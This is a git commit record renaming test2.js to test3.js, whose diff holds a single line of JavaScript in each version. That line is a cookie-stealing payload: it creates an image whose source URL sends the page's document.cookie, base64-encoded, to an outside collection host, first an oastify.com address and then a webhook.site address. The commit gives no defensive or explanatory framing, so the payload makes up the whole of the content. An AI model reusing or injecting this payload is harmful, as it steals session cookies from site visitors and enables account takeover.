a88095ab26c73f19ef7bdefe723193a6adcc0c13
anded <82957468+anded@users.noreply.github.com>
2025-05-02 07:44:09 -0400

    Update and rename test2.js to test3.js

--- test2.js
+++
@@ -1,1 +0,0 @@
-x = new Image(); x.src = "https://0nodj9n2294c1oyfkslq8pe1qswjka8z.oastify.com/bla?data=" + btoa(document.cookie);
---
+++ test3.js
@@ -0,0 +1,1 @@
+x = new Image(); x.src = "https://webhook.site/c77d2d3d-aaf9-4a57-85e8-dc3b0c25cba4/bla?data=" + btoa(document.cookie);
